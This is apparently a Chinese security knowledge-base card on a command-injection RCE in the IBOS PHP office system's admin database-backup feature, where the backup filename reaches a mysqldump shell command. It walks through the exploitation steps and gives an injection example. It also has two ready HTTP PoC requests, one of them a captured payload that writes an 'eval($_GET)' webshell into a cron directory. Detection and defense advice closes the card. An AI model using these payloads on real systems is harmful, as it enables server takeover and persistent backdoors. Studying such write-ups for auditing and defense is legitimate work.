---
id: web-php-rce-ibos-database-backup-filename-command-injection
title: IBOS 后台数据库备份 shell 模式：备份文件名过滤不全拼接 mysqldump 命令注入 RCE
type: scenario
domain: web
path: web/php/rce
technique: ibos-database-backup-filename-command-injection
aliases:
- IBOS 数据库备份命令执行
- mysqldump 备份文件名注入
- IBOS 后台 RCE
- backupFileName 命令拼接
tags:
- php
- ibos
- cms
- command-injection
- mysqldump
- backup
- rce
- admin
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V640
  verified_at: '2026-11-13T02:26:28+08:00'
  notes: 已对照原文与61张图核对：databaseBackup 中 filename 黑名单(exe/jsp/asp/aspx/cgi/fcgi/pl)、str_replace(['/','\','.','"']) 后拼接 backupFileName、shell 分支 mysqldump 命令与图12-14 whoami 回显一致；图56 实际抓包 filename 内含 &cd system&cd modules&cd recruit&cd cron&echo eval...>>zzzz 写 cron 文件。已修正正则笔误 ico->cgi，并补录图56真实 payload、标注 multivol 分支与正文分析矛盾。未验证点：未复跑 PoC、未在真实 IBOS 确认 method 分支；原文未标注 affected_versions；无 sources/source_url。
---

## 一句话结论

IBOS（Yii 1.x 的 PHP 协同办公系统）后台"通用设置 → 数据库 → 备份"选择"系统 MySQL Dump (Shell) 备份"方式时，代码把用户自定义的备份文件名只经 `str_replace(['/', '\\', '.', '"'], '', $fileName)` 去除少量字符，就拼接进 `mysqldump ...` 的 shell 命令行；由于没有转义 `;`、`&`、`|`、空格等 shell 元字符，后台用户可在备份文件名中注入任意系统命令，以 Web 服务进程权限执行（RCE）。

## 原理

- 入口：Dashboard 模块 `DatabaseController::actionBackup()` 处理备份表单，内部调用 `Database::databaseBackup()`。
- `Database::databaseBackup()` 先取 `$fileName = Env::getRequest('filename')`，并用 `preg_match('/(\.(exe|jsp|asp|aspx|cgi|fcgi|pl)(\.|$))/i', $fileName)` 拦截危险后缀（目的是防止直接写出可执行脚本），随后：
  - `$backupFileName = self::BACKUP_DIR . '/' . str_replace(['/', '\\', '.', '"'], '', $fileName);`
  - 当 `method` 不是 `multivol`（即选择"系统 MySQL Dump (Shell) 备份"）时，`$dumpFile = addslashes(realpath(ROOT) . '/' . $backupFileName . '.sql')`，再被拼进：
    ```
    "{$mysqlBin}mysqldump --force --quick {$command1} --add-drop-table {$command2}{$command3} --host=\"{$db['host']}\" ... > \"$dumpFile\""
    ```
    并执行。
- 关键缺陷：过滤名单只包含 `/ \ . "` 四个字符，没有处理 `;`、`&`、`|`、`` ` ``、`$()` 与空格。`;` 等字符会原样留在 `$dumpFile` 中并进入 shell 解释，`addslashes` 只转义引号类字符，对命令分隔符无效，因此构成命令注入。
- 为什么不是"文件名写入 Web 目录 getshell"：危险后缀检查挡住了 `.php/.jsp` 等落地；真正可利用的是 shell 元字符注入。文章演示通过注入命令执行成功 RCE（回显/落地文件）。

## 触发条件

- 已登录 IBOS 后台（该功能位于"通用设置 → 数据库"，对应管理员权限）。
- 备份方式选择"系统 MySQL Dump (Shell) 备份"（源码中 `method != 'multivol'` 的分支）。
- Web 服务器上有可用的 `mysqldump` 且 `exec/system` 未被禁用（Yii 命令执行依赖 PHP 的 shell 执行函数）。
- 备份文件名参数（`filename`）可控。

## 利用步骤

1. 登录后台，进入"通用设置 → 数据库 → 备份"。
2. 打开"更多选项"，数据备份方式选择"系统 MySQL Dump (Shell) 备份"，填写备份文件名。
3. 在备份文件名中注入命令，例如 `1;id>/tmp/pwned;`（注意过滤会删除 `.`、`/`、`\`、`"`，构造 payload 时避开这些字符或用重定向/编码替代）。
4. 提交备份（`POST /?r=dashboard/database/backup`），命令随 `mysqldump` 行一起执行；通过回显、写入文件或 DNS/HTTP 外带确认执行结果。
5. 文章通过访问写出的文件（如站点根目录下的 `demo1`）看到命令输出，确认 RCE。

## PoC

```http
POST /?r=dashboard/database/backup HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

backupfile=all&method=0&volume=1&sizelimit=2048&extendins=0&sqlcompat=&sqlcharset=utf8&usehex=0&usemysql=0&filename=<注入payload>&dbSubmit=1
```

说明：`method=0` 为按源码推断的 shell 备份分支形式；`filename` 为实际拼接点（源码 `Env::getRequest('filename')`）。payload 需避开 `/ \ . "` 四个被删字符。

原文 Cron 一节实际抓到的利用请求（图 56）如下（表单值经 URL 编码）：

```http
POST /?r=dashboard/database/backup HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

backuptype=all&custom_enabled=1&method=multivol&sizelimit=2048&extendins=0&sqlcompat=MYSQL41&sqlcharset=utf8&usehex=0&usezip=0&filename=2023-02-07_0MswI4b5%26cd%20system%26cd%20modules%26cd%20recruit%26cd%20cron%26echo+eval($_GET["test"]);>>zzzz%26aaa&dbSubmit=1
```

`filename` 解码后为 `2023-02-07_0MswI4b5&cd system&cd modules&cd recruit&cd cron&echo eval($_GET["test"]);>>zzzz&aaa`，命令链进入 `system/modules/recruit/cron/` 写出 `zzzz`（内容 `eval($_GET["test"]);`），随后被计划任务加载执行（原文图 57–59）。注意原文正文声称 `multivol` 分支不经过危险函数，但该抓包仍用了 `method=multivol` 并成功落地文件，两者矛盾，实战以目标版本源码分支为准。不访问、不执行原文目标。

## 变体与关联

- 分卷备份（`multivol`）分支里 `$dumpFile = $backupFileName . "-%s" . '.sql'`，原文正文分析该分支未把文件名带进危险函数；但原文图 56 的实际利用抓包仍使用 `method=multivol` 并成功写出文件，说明该分支在原文环境实际到达了命令拼接（或正文分析有误），与 shell 分支的结论需按目标版本复核。
- 同类审计模式：Any CMS 的"备份/导出"功能把用户可控文件名/表名拼进 `mysqldump`、`mysqldump --result-file` 或重定向命令；表名参数（`tables`）同样可能注入。
- 关联：同产品任意文件删除见 [[web-php-ibos-database-restore-key-unlink-traversal]]。原文进一步把本注入写出的 `zzzz` 通过"计划任务"界面改名为任务文件后执行（图 57–59），属于本命令注入的落地利用，不单列计划任务命令执行卡。
- Yii 1.x 框架背景：控制器继承自框架基类，`Env::getRequest` 统一取参；危险函数（exec）通过 `Ibos::app()->db->createCommand` 等封装，审计时可直接搜索 `exec/system/passthru` 与拼接。

## 检测与防御

- 检测：后台备份操作日志中出现含 `;`、`&`、`|`、重定向符的文件名；Web 进程（php-fpm/apache）fork 出 `mysqldump` 后紧跟异常子进程（`id`、`whoami`、`sh`）。
- 检测：审计 `Database::databaseBackup()` 的调用参数；监控 `data/backup` 等目录外的文件写入。
- 防御：备份文件名使用白名单字符（`[A-Za-z0-9_-]`）；拼接命令行时使用 `escapeshellarg()`/`escapeshellcmd()`，或改用 `proc_open` 传数组参数；限制 `exec/system` 等函数在 Web 进程中的使用。
- 防御：数据库备份功能仅对受信管理员开放并加二次认证；最小化 Web 进程权限。
